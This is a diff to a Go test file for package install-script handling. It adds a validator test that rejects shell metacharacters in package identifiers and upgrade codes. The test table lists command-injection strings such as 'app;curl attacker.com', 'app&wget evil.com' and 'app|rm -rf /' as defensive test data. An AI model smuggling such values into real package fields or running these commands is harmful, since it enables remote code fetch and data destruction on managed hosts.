@@ -45,9 +45,9 @@ func TestGetInstallAndRemoveScript(t *testing.T) {
 			"uninstall": "./scripts/uninstall_rpm.sh",
 		},
 		"exe": {
-			"install":   "./scripts/install_exe.ps1",
+			"install":   "",
 			"remove":    "./scripts/remove_exe.ps1",
-			"uninstall": "./scripts/uninstall_exe.ps1",
+			"uninstall": "",
 		},
 	}
 
@@ -61,13 +61,89 @@ func TestGetInstallAndRemoveScript(t *testing.T) {
 		gotScript = GetUninstallScript(itype)
 		assertGoldenMatches(t, scripts["uninstall"], gotScript, *update)
 	}
+
+	// Fleetd-specific install script for pkg
+	assertGoldenMatches(t, "./scripts/install_pkg_fleetd.sh", InstallPkgFleetdScript, *update)
+}
+
+func TestValidatePackageIdentifiers(t *testing.T) {
+	t.Parallel()
+
+	t.Run("valid identifiers", func(t *testing.T) {
+		validIDs := []string{
+			"com.example.app",
+			"ruby",
+			"org.mozilla.firefox",
+			"{12345-ABCDE-67890}",
+			"Microsoft.VisualStudioCode",
+			"package/name",
+			"my-app_v2.0+build1",
+			"app:latest",
+			"name@version",
+			"path/to/pkg",
+			"a~b",
+			"comma,separated",
+			"with spaces",
+			"CrossCore\u00ae Embedded Studio v3.0.2",
+			"Adobe Acrobat (64-bit)",
+			"C# Runtime",
+			"日本語アプリ",
+		}
+		require.NoError(t, ValidatePackageIdentifiers(validIDs, ""))
+		require.NoError(t, ValidatePackageIdentifiers(nil, "{UPGRADE-CODE-123}"))
+		require.NoError(t, ValidatePackageIdentifiers(validIDs, "{UPGRADE-CODE-123}"))
+	})
+
+	t.Run("empty inputs", func(t *testing.T) {
+		require.NoError(t, ValidatePackageIdentifiers(nil, ""))
+		require.NoError(t, ValidatePackageIdentifiers([]string{}, ""))
+	})
+
+	t.Run("malicious package IDs", func(t *testing.T) {
+		maliciousIDs := []struct {
+			name string
+			id   string
+		}{
+			{"command substitution", "com.app$(id)"},
+			{"backtick execution", "app`id`"},
+			{"pipe injection", "app|rm -rf /"},
+			{"semicolon injection", "app;curl attacker.com"},
+			{"ampersand injection", "app&wget evil.com"},
+			{"redirect output", "app>file"},
+			{"redirect input", "app<file"},
+			{"single quote", "app'break"},
+			{"double quote", `app"break`},
+			{"backslash", `app\n`},
+			{"newline", "app\nid"},
+			{"exclamation", "app!cmd"},
+		}
+		for _, tc := range maliciousIDs {
+			t.Run(tc.name, func(t *testing.T) {
+				err := ValidatePackageIdentifiers([]string{tc.id}, "")
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), "contains invalid characters")
+			})
+		}
+	})
+
+	t.Run("malicious upgrade code", func(t *testing.T) {
+		err := ValidatePackageIdentifiers(nil, "code$(id)")
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "upgrade code")
+		assert.Contains(t, err.Error(), "contains invalid characters")
+	})
 }
 
 func assertGoldenMatches(t *testing.T, goldenFile string, actual string, update bool) {
 	t.Helper()
+	if goldenFile == "" {
+		require.Empty(t, actual)
+		return
+	}
+
 	goldenPath := filepath.Join("testdata", goldenFile+".golden")
 
-	f, err := os.OpenFile(goldenPath, os.O_RDWR|os.O_CREATE, 0o644)
+	f, err := os.OpenFile(goldenPath, os.O_RDWR|os.O_CREATE, 0o644) // nolint:gosec // G302
 	require.NoError(t, err)
 	defer f.Close()
 
